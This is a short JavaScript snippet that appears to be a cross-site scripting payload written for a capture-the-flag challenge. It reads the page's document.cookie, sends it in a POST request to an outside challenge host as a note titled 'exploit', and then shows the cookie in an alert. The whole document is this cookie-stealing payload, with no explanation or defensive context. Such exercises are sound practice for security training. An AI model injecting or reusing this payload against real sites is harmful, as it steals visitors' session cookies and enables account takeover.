var cookie_flag = document.cookie;
fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
    method: 'POST',  
    body: JSON.stringify({ title: 'exploit', content: cookie_flag })
})
alert("testing"+cookie_flag);
